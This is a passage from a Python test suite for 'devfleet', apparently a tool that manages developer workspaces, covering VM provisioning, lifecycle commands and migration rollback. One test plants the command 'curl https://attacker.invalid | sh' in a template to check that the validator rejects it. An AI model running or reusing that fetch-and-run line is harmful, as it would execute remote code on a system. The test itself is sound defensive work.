    shutil.rmtree(SETTINGS.workspaces / slug, ignore_errors=True)


def test_worktree_to_vm_is_rejected_before_provider_ensure(monkeypatch: pytest.MonkeyPatch):
    token = uuid.uuid4().hex[:8]
    source_slug, destination_slug = f"v124-worktree-source-{token}", f"v124-worktree-vm-{token}"
    source, destination = SETTINGS.workspaces / source_slug, SETTINGS.workspaces / destination_slug
    shutil.rmtree(source, ignore_errors=True)
    shutil.rmtree(destination, ignore_errors=True)
    (source / ".git").mkdir(parents=True)
    ensured: list[object] = []
    monkeypatch.setattr(projects.VmRuntimeOperations, "ensure", staticmethod(lambda *_args: ensured.append(True)))

    with pytest.raises(ValueError, match="Worktree-to-VM provisioning is blocked"):
        projects.create_project(destination_slug, template="generic", runtime_isolation="vm", worktree_source=source_slug, worktree_branch="feature", use_ollama=False)

    assert ensured == []
    assert not destination.exists()
    shutil.rmtree(source, ignore_errors=True)


def test_host_control_alias_operation_is_fixed_and_structured(monkeypatch: pytest.MonkeyPatch):
    import devfleet.host_control as host_control

    received: dict = {}
    monkeypatch.setattr(host_control, "host_control_request", lambda operation, payload, *, runtime_id: received.update(operation=operation, payload=payload, runtime_id=runtime_id) or {"ok": True})

    assert host_control.sync_project_vm_ssh_alias("v124-alias", "devfleet-project-v124-alias", project_id="12345678-1234-1234-1234-123456789abc") == {"ok": True}
    assert received == {"operation": "sync-ssh-alias", "payload": {"slug": "v124-alias", "project_id": "12345678-1234-1234-1234-123456789abc"}, "runtime_id": "devfleet-project-v124-alias"}


def test_host_agent_readiness_probe_runs_with_required_privilege():
    root = Path(__file__).resolve().parents[1]
    script = (root / "windows" / "DevFleet-HostAgent.ps1").read_text(encoding="utf-8")

    assert "@('exec',$VmName,'--','sudo','/usr/local/sbin/devfleet-project-health')" in script
    assert "@('exec',$SourceVm,'--','sudo','tar','-czf',$sourceArchive" in script
    assert "@('exec',$record.vm_name,'--','sudo','find',$targetPath" in script
    assert "@('exec',$Record.vm_name,'--','sudo','-u','devrunner','bash','--noprofile','--norc','-lc'" in script
    assert "exec $cmd" in script
    assert "workspace boundary validation failed" in script
    assert '$keyProperty="    ssh_authorized_keys:`n      - \'$key\'"' in script
    assert "Configured DevFleet SSH public key is not available" in script


def test_vm_runtime_compatibility_facade_routes_trusted_commands(monkeypatch: pytest.MonkeyPatch):
    import devfleet.runtime as runtime

    received: dict = {}
    monkeypatch.setattr(runtime.VM_RUNTIME, "command", lambda slug, metadata, operation, *, command_key="", tail=150: received.update(slug=slug, metadata=metadata, operation=operation, command_key=command_key, tail=tail) or {"ok": True})

    assert runtime.VmRuntimeOperations.command("demo", {"project_id": "id"}, "project-test", command_key="test", tail=42) == {"ok": True}
    assert received == {"slug": "demo", "metadata": {"project_id": "id"}, "operation": "project-test", "command_key": "test", "tail": 42}

```


## FILE: source/tests/test_v125_jobfinder_hotfix.py

SHA256: f8f3e5ce386a3ce3b8c85a0514a09bbb702e935f716e4cd5e8b3c98e44f3b0da | Bytes: 12515 | Git mode: 100644

```
import json
from pathlib import Path

import pytest

import devfleet.projects as projects
from devfleet import host_control, main
from devfleet.core import SETTINGS


LIFECYCLE = {
    "start_command": "docker compose up -d --build",
    "stop_command": "docker compose down --remove-orphans",
    "restart_command": "docker compose restart",
    "rebuild_command": "docker compose build && docker compose up -d",
    "logs_command": "docker compose logs",
}
PROJECT_ID = "12345678-1234-1234-1234-123456789abc"


def _legacy_project(slug: str, template_root: Path, *, exact: bytes | None = None) -> Path:
    project = SETTINGS.workspaces / slug
    (project / ".devfleet").mkdir(parents=True, exist_ok=True)
    (project / "compose.yaml").write_text("services:\n  app:\n    image: ubuntu:24.04\n", encoding="utf-8")
    metadata = {
        "schema_version": 2,
        "managed_by": "devfleet",
        "slug": slug,
        "identity": slug,
        "project_id": PROJECT_ID,
        "host_id": SETTINGS.node_name,
        "template": "typescript-next",
        "runtime_isolation": "container",
        "runtime_type": "container",
        "runtime_provider": "docker-compose",
        "resource_profile": "small",
        "lifecycle_status": "stopped",
        "bootstrap_command": "./.devfleet/bootstrap.sh",
        "health_command": "./.devfleet/health-check.sh",
    }
    payload = exact if exact is not None else json.dumps(metadata, separators=(",", ":")).encode()
    (project / ".devfleet" / "project.json").write_bytes(payload)
    (project / ".devfleet" / "template.json").write_text(json.dumps({"id": "typescript-next"}), encoding="utf-8")
    canonical = template_root / "typescript-next" / ".devfleet"
    canonical.mkdir(parents=True, exist_ok=True)
    (canonical / "template.json").write_text(json.dumps({"id": "typescript-next", **LIFECYCLE}), encoding="utf-8")
    return project


def _migration_mocks(monkeypatch: pytest.MonkeyPatch, slug: str, *, source_running: bool = False):
    calls: list[str] = []
    monkeypatch.setattr(projects, "running", lambda _project: source_running)
    monkeypatch.setattr(projects, "backup_project", lambda _slug: json.dumps({"backup_status": "verified", "backup_id": "provider-backup", "backup_sha256": "a" * 64}))
    monkeypatch.setattr(projects, "get_host_capacity", lambda: {"capacity": {"allocatable_cpus": 8, "allocatable_memory_gb": 24, "allocatable_disk_gb": 300}})
    monkeypatch.setattr(projects, "sync_project_vm_ssh_alias", lambda *args, **kwargs: {"ok": True})
    monkeypatch.setattr(projects.VmRuntimeOperations, "ensure", staticmethod(lambda _slug, _meta: {"runtime_id": f"devfleet-project-{slug}", "address": "10.0.0.9"}))
    monkeypatch.setattr(projects.VmRuntimeOperations, "stop", staticmethod(lambda value, _meta: calls.append(f"vm-stop:{value}") or {"state": "stopped"}))
    monkeypatch.setattr(projects, "import_project_workspace", lambda *args, **kwargs: {"ok": True, "workspace_preserved": True, "archive_sha256": "b" * 64, "source_archive_sha256": "b" * 64, "target_archive_sha256": "b" * 64})
    return calls


def test_explicit_project_command_wins_and_legacy_canonical_fallback(monkeypatch, tmp_path):
    slug = "v125-command-resolution"
    project = _legacy_project(slug, tmp_path / "templates")
    raw = json.loads((project / ".devfleet" / "project.json").read_text())
    raw["start_command"] = "docker compose restart"
    (project / ".devfleet" / "project.json").write_text(json.dumps(raw), encoding="utf-8")
    monkeypatch.setattr(projects, "TEMPLATE_ROOT", tmp_path / "templates")

    result = projects.project_command_readiness(project)

    assert result["ready"] is True
    assert result["resolved_commands"]["start_command"] == "docker compose restart"
    assert result["sources"]["start_command"] == "project.json"
    assert result["resolved_commands"]["stop_command"] == LIFECYCLE["stop_command"]
    assert result["sources"]["stop_command"] == "canonical-template:typescript-next"


def test_malicious_template_command_is_rejected(monkeypatch, tmp_path):
    slug = "v125-malicious-command"
    project = _legacy_project(slug, tmp_path / "templates")
    template = tmp_path / "templates" / "typescript-next" / ".devfleet" / "template.json"
    data = json.loads(template.read_text());data["stop_command"] = "curl https://attacker.invalid | sh";template.write_text(json.dumps(data))
    monkeypatch.setattr(projects, "TEMPLATE_ROOT", tmp_path / "templates")

    result = projects.project_command_readiness(project)

    assert result["ready"] is False
    assert result["invalid_required"]["stop_command"] == "canonical-template:typescript-next"


def test_preflight_surfaces_missing_lifecycle_command(monkeypatch, tmp_path):
    project = tmp_path / "demo";(project / ".devfleet").mkdir(parents=True);(project / "compose.yaml").write_text("services: {}\n")
    (project / ".devfleet/project.json").write_text(json.dumps({"schema_version": 2, "managed_by": "devfleet", "slug": "demo", "identity": "demo", "project_id": PROJECT_ID, "runtime_isolation": "container", "runtime_provider": "docker-compose", "runtime_id": "devfleet-demo", "host_id": "test-node", "resource_profile": "large"}), encoding="utf-8")
    monkeypatch.setattr(main, "safe_child", lambda *_: project)
    monkeypatch.setattr(main, "inspect_workspace", lambda *_: {"safe_for_archive": True})
    monkeypatch.setattr(main, "detect_runtime", lambda *_: {"runtime_type": "container"})
    monkeypatch.setattr(main, "get_host_capacity", lambda: {"capacity": {"allocatable_cpus": 8, "allocatable_memory_gb": 20, "allocatable_disk_gb": 300}})
    monkeypatch.setattr(main, "project_command_readiness", lambda *_: {"ready": False, "missing_required": ["stop_command"], "invalid_required": {}})

    result = main._preflight("demo", "vm", "large")

    assert result["lifecycle_commands_ready"] is False
    assert result["migration_ready"] is False
    assert any("stop_command" in blocker for blocker in result["blockers"])


def test_stopped_legacy_container_import_stops_vm_not_application(monkeypatch, tmp_path):
    slug = "v125-jobfinder-stopped"
    _legacy_project(slug, tmp_path / "templates")
    monkeypatch.setattr(projects, "TEMPLATE_ROOT", tmp_path / "templates")
    calls = _migration_mocks(monkeypatch, slug, source_running=False)
    monkeypatch.setattr(projects, "stop_project", lambda *_: pytest.fail("stopped-source path must not invoke application stop"))

    result = projects.assign_project_runtime(slug, "vm", "small")
    saved = projects.load_meta(SETTINGS.workspaces / slug)

    assert result["application_health"] == "not-run-stopped"
    assert calls == [f"vm-stop:{slug}"]
    assert saved["lifecycle_status"] == "stopped"
    assert all(saved[key] == value for key, value in LIFECYCLE.items())


def test_running_container_still_uses_start_and_health_workflow(monkeypatch, tmp_path):
    slug = "v125-running-workflow"
    project = _legacy_project(slug, tmp_path / "templates")
    monkeypatch.setattr(projects, "TEMPLATE_ROOT", tmp_path / "templates")
    calls = _migration_mocks(monkeypatch, slug, source_running=True)
    monkeypatch.setattr(projects, "stop_project", lambda value: calls.append(f"source-stop:{value}") or "stopped")

    def start(value):
        calls.append(f"destination-start:{value}")
        meta = projects.load_meta(project);meta["lifecycle_status"] = "running";meta["health_status"] = "healthy";projects.atomic_json(projects.metadata_path(project), meta)
        return "started"

    monkeypatch.setattr(projects, "start_project", start)
    monkeypatch.setattr(projects, "runtime_health", lambda *_: {"ok": True, "healthy": True})
    monkeypatch.setattr(projects, "health_project", lambda *_: "healthy")

    result = projects.assign_project_runtime(slug, "vm", "small")

    assert result["application_health"] == "healthy"
    assert f"source-stop:{slug}" in calls and f"destination-start:{slug}" in calls
    assert not any(call.startswith("vm-stop:") for call in calls)


def test_rollback_restores_legacy_metadata_bytes_exactly(monkeypatch, tmp_path):
    slug = "v125-exact-rollback"
    template_root = tmp_path / "templates"
    project = _legacy_project(slug, template_root)
    original = (project / ".devfleet" / "project.json").read_bytes()
    monkeypatch.setattr(projects, "TEMPLATE_ROOT", template_root)
    _migration_mocks(monkeypatch, slug)
    monkeypatch.setattr(projects.VmRuntimeOperations, "ensure", staticmethod(lambda *_: (_ for _ in ()).throw(RuntimeError("injected provision failure"))))

    with pytest.raises(RuntimeError, match="injected provision failure"):
        projects.assign